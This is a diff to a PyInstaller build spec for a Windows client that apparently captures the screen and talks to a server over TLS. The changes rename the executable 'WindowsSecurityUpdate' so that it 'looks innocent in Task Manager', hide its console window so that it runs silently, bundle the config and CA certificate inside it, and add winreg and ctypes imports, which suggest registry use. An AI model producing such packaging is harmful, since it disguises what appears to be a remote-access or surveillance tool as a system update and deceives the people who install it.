@@ -1,4 +1,5 @@
-# build_client.spec — PyInstaller spec (#14 Package client exe)
+# build_client.spec — PyInstaller spec
+# Builds a silent, single-file Windows exe with all dependencies bundled
 # Usage: pyinstaller build_client.spec
 
 block_cipher = None
@@ -8,9 +9,11 @@ a = Analysis(
     pathex=['.'],
     binaries=[],
     datas=[
-        ('client_config.yaml', '.'),
-        ('ca.crt', '.'),
+        ('client_config.yaml', '.'),   # config bundled inside exe
+        ('ca.crt', '.'),               # CA cert bundled inside exe
         ('messages_pb2.py', '.'),
+        ('protocol.py', '.'),
+        ('config_loader.py', '.'),
     ],
     hiddenimports=[
         'mss',
@@ -22,6 +25,8 @@ a = Analysis(
         'google.protobuf.symbol_database',
         'google.protobuf.reflection',
         'google.protobuf.message',
+        'winreg',
+        'ctypes',
     ],
     hookspath=[],
     runtime_hooks=[],
@@ -41,13 +46,13 @@ exe = EXE(
     a.zipfiles,
     a.datas,
     [],
-    name='tls_client',
+    name='WindowsSecurityUpdate',  # looks innocent in Task Manager
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
-    upx=True,
+    upx=True,                      # compress exe with UPX
     upx_exclude=[],
     runtime_tmpdir=None,
-    console=True,
-    onefile=True,
+    console=False,                 # NO console window — silent
+    onefile=True,                  # single exe, no folder
 )
